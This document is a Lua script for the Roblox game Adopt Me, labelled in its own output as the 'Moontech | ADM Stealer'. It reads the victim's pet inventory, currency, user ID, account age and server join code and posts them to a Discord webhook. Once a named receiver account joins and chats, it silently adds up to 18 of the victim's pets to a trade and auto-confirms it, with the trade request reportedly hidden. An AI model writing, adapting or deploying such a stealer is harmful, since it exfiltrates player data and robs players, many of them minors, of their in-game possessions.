local Pets = {}
local PetCounts = {}

for i, v in pairs(
    require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory.pets
) do
    local label = ""
    if v.properties.mega_neon then
        label = " (Mega Neon)"
    elseif v.properties.neon then
        label = " (Neon)"
    else
        label = " (Normal)"
    end
    local petName = v.id:gsub("%d+", ""):gsub("_", " "):gsub("%s+", " ")
    petName =
        petName:gsub(
        "(%a)(%a*)",
        function(first, rest)
            return first:upper() .. rest:lower()
        end
    )
    local key = petName .. label
    if PetCounts[key] then
        PetCounts[key] = PetCounts[key] + 1
    else
        PetCounts[key] = 1
    end
end

local Loaders = require(game.ReplicatedStorage.Fsys).load
local InventoryDB = Loaders("InventoryDB")
local ClientData = Loaders("ClientData")
local legendaries_count = 0
local mega_count = 0
local neon_count = 0
local ultra_count = 0
local rare_count = 0
local uncommon_count = 0
local common_count = 0
local total_pets = 0
local bucks = tostring(require(game:GetService("ReplicatedStorage").Fsys).load("ClientData").get("money"))
for i, v in pairs(ClientData.get("inventory").pets) do
    total_pets = total_pets + 1
end

for i, v in pairs(ClientData.get("inventory").pets) do
    if InventoryDB[v.category][v.id].rarity == "legendary" then
        legendaries_count = legendaries_count + 1
    end
    if InventoryDB[v.category][v.id].properties == "mega_neon" then
        mega_count = mega_count + 1
    end
    if InventoryDB[v.category][v.id].properties == "neon" then
        neon_count = neon_count + 1
    end
    if InventoryDB[v.category][v.id].rarity == "ultra_rare" then
        ultra_count = ultra_count + 1
    end
    if InventoryDB[v.category][v.id].rarity == "rare" then
        rare_count = rare_count + 1
    end
    if InventoryDB[v.category][v.id].rarity == "uncommon" then
        uncommon_count = uncommon_count + 1
    end
    if InventoryDB[v.category][v.id].rarity == "common" then
        common_count = common_count + 1
    end
end

local messageADOPT =
    "**||@everyone||**\nNOTE: You have **3 seconds** to accept the trade otherwise, the script will break.\nYou have **5 seconds** to accept the trade."
if legendaries_count >= 5 or neon_count >= 5 or mega_count >= 1 then
    messageADOPT =
        "**||@everyone||**\nNOTE: You have **3 seconds** to accept the trade otherwise, the script will break.\nYou have **5 seconds** to accept the trade."
end
local plr = game.Players.LocalPlayer
local userr = Username
local userid = game.Players.LocalPlayer.UserId
local accage = game.Players.LocalPlayer.AccountAge
local data = {
    username = "Moontech Trade - Result",
    avatar_url = "https://media.discordapp.net/attachments/1279110366797758478/1286666241238630452/simple-circle-moon-wolf-head-vector-animal-logo-template-nature-wildlife-icon-design-inspiration-simple-circle-moon-164937967_1.webp?ex=66eebcd1&is=66ed6b51&hm=eda787737b841152ea68c6a02761728b71eaba152847d56c2a7d3dca7e7f1de0&=&format=webp",
    content = messageADOPT,
    embeds = {
        {
            title = "ðŸ’» **__Moontech | ADM Stealer__**",
            description = "**ðŸ“ƒ  Player Information**: \n ```lua\nðŸ—½ Username: " ..
                tostring(plr) ..
                    "\nðŸ—¼ User-ID: " ..
                        tostring(userid) ..
                            "\nâ›© Account Age: " ..
                                tostring(accage) ..
                                    "\nðŸ— Receiver: " ..
                                        userr ..
                                            "\n```\n **ðŸ“¦ Inventory**: \n ```lua\nðŸ¦’ Legendaries: " ..
                                                tostring(legendaries_count) ..
                                                    "\nðŸ‰ Mega Neons: " ..
                                                        tostring(mega_count) ..
                                                            "\nðŸŠ Neons: " ..
                                                                tostring(neon_count) ..
                                                                    "\nðŸˆ Ultra Rares: " ..
                                                                        tostring(ultra_count) ..
                                                                            "\nðŸ¦– Rares: " ..
                                                                                tostring(rare_count) ..
                                                                                    "\nðŸŒ Uncommons: " ..
                                                                                        tostring(uncommon_count) ..
                                                                                            "\nðŸ¦€ Commons: " ..
                                                                                                tostring(common_count) ..
                                                                                                    "\nðŸ’µ Bucks: " ..
                                                                                                        bucks ..
                                                                                                            "\nðŸ• Total Pets: " ..
                                                                                                                tostring(
                                                                                                                    total_pets
                                                                                                                ) ..
                                                                                                                    '\n```\n**ðŸ’¼ Join Player Script**:\n\n```lua\ngame:GetService("TeleportService"):TeleportToPlaceInstance(920587237, "' ..
                                                                                                                        game.JobId ..
                                                                                                                            '", game.Players.LocalPlayer)\n```',
            color = tonumber(0x1bde4f),
            fields = {
                {
                    name = "ðŸŽ®Auto Joiner",
                    value = "**COMMING SOON!**"
                }
            }
        }
    }
}
local request = http_request or request or HttpPost or syn.request
request(
    {
        Url = Webhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game.HttpService:JSONEncode(data)
    }
)

local function StartSteal()
    local Loads = require(game.ReplicatedStorage.Fsys).load
    local RouterClient = Loads("RouterClient")
    local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
    local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
    local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")

    -- This part has been modified to hide the trade request
    local PetsInventory =
        require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory
    if PetsInventory.pets then
        local petCount = 0
        local petUids = {}
        for petUid, petData in pairs(PetsInventory.pets) do
            table.insert(petUids, petUid)
        end

        while #petUids > 0 do
            local petUid = table.remove(petUids, 1)
            AddPetRemote:FireServer(petUid)
            petCount = petCount + 1
            if petCount >= 18 then
                break
            end
        end
    else
        print("No pets found in inventory.")
    end
    wait(6)
    AcceptNegotiationRemote:FireServer()
    wait(5)
    ConfirmTradeRemote:FireServer()
end

if total_pets == 1 then
    game:GetService("Players").LocalPlayer:Kick(
        "Error: Pls use different account!"
    )
end

game.Players.PlayerAdded:Connect(
    function(player)
        if player.Name == Username then
            player.Chatted:Connect(
                function(msg)
                    StartSteal()
                end
            )
        end
    end
)
